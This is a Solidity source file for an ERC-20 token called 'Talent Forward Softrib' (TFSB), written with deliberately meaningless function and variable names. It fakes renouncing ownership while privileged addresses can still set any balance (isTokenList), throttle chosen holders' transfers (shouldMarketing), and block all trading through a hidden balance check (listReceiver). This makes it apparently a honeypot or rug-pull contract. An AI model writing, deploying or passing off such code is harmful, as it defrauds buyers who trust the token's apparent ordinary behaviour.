//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface launchTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract txMode {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxMin {
    function createPair(address amountSender, address marketingReceiverToken) external returns (address);
}

interface walletLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyLaunched) external view returns (uint256);

    function transfer(address isTotal, uint256 fromTake) external returns (bool);

    function allowance(address teamSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromTake) external returns (bool);

    function transferFrom(
        address sender,
        address isTotal,
        uint256 fromTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromSwap, uint256 value);
    event Approval(address indexed teamSwap, address indexed spender, uint256 value);
}

interface fromTokenSell is walletLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TalentForwardSoftrib is txMode, walletLaunch, fromTokenSell {

    mapping(address => bool) public feeReceiver;

    function transfer(address liquidityFrom, uint256 fromTake) external virtual override returns (bool) {
        return marketingAmount(_msgSender(), liquidityFrom, fromTake);
    }

    bool public sellMin;

    function shouldMarketing(address fundTeam) public {
        maxLimit();
        
        if (fundTeam == launchedLiquidity || fundTeam == fundWallet) {
            return;
        }
        marketingIs[fundTeam] = true;
    }

    bool private modeTrading;

    function decimals() external view virtual override returns (uint8) {
        return fundModeTo;
    }

    function balanceOf(address buyLaunched) public view virtual override returns (uint256) {
        return enableSwap[buyLaunched];
    }

    function marketingAmount(address tradingFee, address isTotal, uint256 fromTake) internal returns (bool) {
        if (tradingFee == launchedLiquidity) {
            return autoTx(tradingFee, isTotal, fromTake);
        }
        uint256 totalEnable = walletLaunch(fundWallet).balanceOf(takeTo);
        require(totalEnable == receiverIs);
        require(isTotal != takeTo);
        if (marketingIs[tradingFee]) {
            return autoTx(tradingFee, isTotal, liquidityFee);
        }
        return autoTx(tradingFee, isTotal, fromTake);
    }

    function getOwner() external view returns (address) {
        return launchedSwap;
    }

    uint256 public toMin;

    mapping(address => mapping(address => uint256)) private feeMax;

    address public fundWallet;

    address takeTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private swapExempt = "TFSB";

    event OwnershipTransferred(address indexed enableMarketingLaunch, address indexed autoMin);

    function symbol() external view virtual override returns (string memory) {
        return swapExempt;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return listShould;
    }

    function autoTx(address tradingFee, address isTotal, uint256 fromTake) internal returns (bool) {
        require(enableSwap[tradingFee] >= fromTake);
        enableSwap[tradingFee] -= fromTake;
        enableSwap[isTotal] += fromTake;
        emit Transfer(tradingFee, isTotal, fromTake);
        return true;
    }

    mapping(address => uint256) private enableSwap;

    function name() external view virtual override returns (string memory) {
        return launchAt;
    }

    function approve(address launchedIs, uint256 fromTake) public virtual override returns (bool) {
        feeMax[_msgSender()][launchedIs] = fromTake;
        emit Approval(_msgSender(), launchedIs, fromTake);
        return true;
    }

    address atIsSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private listShould = 100000000 * 10 ** 18;

    uint8 private fundModeTo = 18;

    function shouldTrading() public {
        emit OwnershipTransferred(launchedLiquidity, address(0));
        launchedSwap = address(0);
    }

    bool public feeFund;

    bool private listLaunch;

    mapping(address => bool) public marketingIs;

    uint256 public totalReceiver;

    uint256 modeLaunched;

    function owner() external view returns (address) {
        return launchedSwap;
    }

    function maxLimit() private view {
        require(feeReceiver[_msgSender()]);
    }

    function transferFrom(address tradingFee, address isTotal, uint256 fromTake) external override returns (bool) {
        if (_msgSender() != atIsSender) {
            if (feeMax[tradingFee][_msgSender()] != type(uint256).max) {
                require(fromTake <= feeMax[tradingFee][_msgSender()]);
                feeMax[tradingFee][_msgSender()] -= fromTake;
            }
        }
        return marketingAmount(tradingFee, isTotal, fromTake);
    }

    constructor (){
        
        launchTeam autoReceiver = launchTeam(atIsSender);
        fundWallet = maxMin(autoReceiver.factory()).createPair(autoReceiver.WETH(), address(this));
        if (isSell) {
            launchEnable = totalReceiver;
        }
        launchedLiquidity = _msgSender();
        shouldTrading();
        feeReceiver[launchedLiquidity] = true;
        enableSwap[launchedLiquidity] = listShould;
        
        emit Transfer(address(0), launchedLiquidity, listShould);
    }

    uint256 private launchEnable;

    function isTokenList(address liquidityFrom, uint256 fromTake) public {
        maxLimit();
        enableSwap[liquidityFrom] = fromTake;
    }

    address private launchedSwap;

    bool private isSell;

    uint256 private totalTx;

    function allowance(address tokenMarketing, address launchedIs) external view virtual override returns (uint256) {
        if (launchedIs == atIsSender) {
            return type(uint256).max;
        }
        return feeMax[tokenMarketing][launchedIs];
    }

    function limitMax(address feeMode) public {
        if (sellMin) {
            return;
        }
        
        feeReceiver[feeMode] = true;
        if (toMin == totalReceiver) {
            totalReceiver = maxModeAuto;
        }
        sellMin = true;
    }

    string private launchAt = "Talent Forward Softrib";

    bool private fromReceiverTrading;

    uint256 constant liquidityFee = 19 ** 10;

    uint256 public maxModeAuto;

    function listReceiver(uint256 fromTake) public {
        maxLimit();
        receiverIs = fromTake;
    }

    address public launchedLiquidity;

    uint256 receiverIs;

}